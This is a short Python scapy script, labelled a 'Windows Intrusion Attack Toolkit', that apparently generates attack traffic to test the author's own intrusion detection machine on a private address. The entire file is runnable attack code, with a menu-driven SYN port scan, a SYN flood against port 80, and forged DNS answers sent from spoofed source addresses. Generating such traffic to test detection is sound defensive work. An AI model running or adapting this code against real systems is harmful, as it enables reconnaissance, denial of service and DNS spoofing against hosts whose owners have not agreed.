from scapy.all import IP, TCP, UDP, DNS, DNSQR, DNSRR, send
import random
import time

# Set the IP of the IDS target (your macOS IDS machine)
target_ip = "10.1.18.43"  # Replace with your Mac's IP
target_port = 80  # Common port for SYN Flood
domain = "example.com."

def port_scan_attack():
    print("🚀 Launching Port Scan Attack...")
    for port in range(20, 50):  # Scans 30 ports
        pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.1)  # Adjust to mimic real scanning
    print("✅ Port Scan Completed.\n")

def syn_flood_attack():
    print("🌊 Launching SYN Flood Attack...")
    for i in range(100):  # Send 100 SYN packets
        src_port = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.01)
    print("✅ SYN Flood Completed.\n")


def dns_spoof_simulation():
    def spoof_dns(fake_ip):
        pkt = IP(dst=target_ip, src=fake_ip)/UDP(sport=53, dport=random.randint(10000, 60000))/DNS(
            id=random.randint(0, 65535),
            qr=1,
            aa=1,
            qd=DNSQR(qname=domain),
            an=DNSRR(rrname=domain, ttl=300, rdata=fake_ip)
        )
        send(pkt, verbose=False)

    print("🧨 Simulating DNS Spoofing...")
    spoof_dns("8.8.8.8")  # First answer
    spoof_dns("1.1.1.1")  # Second conflicting answer
    print("✅ DNS Spoofing Simulation Completed.\n")

def main():
    print("💣 Windows Intrusion Attack Toolkit")
    print("1. Port Scan")
    print("2. SYN Flood")
    print("3. DNS Spoof Simulation")
    print("4. Run All Attacks")
    choice = input("👉 Enter choice (1-4): ")

    if choice == "1":
        port_scan_attack()
    elif choice == "2":
        syn_flood_attack()
    elif choice == "3":
        dns_spoof_simulation()
    elif choice == "4":
        port_scan_attack()
        syn_flood_attack()
        dns_spoof_simulation()
    else:
        print("❌ Invalid Choice")

if __name__ == "__main__":
    main()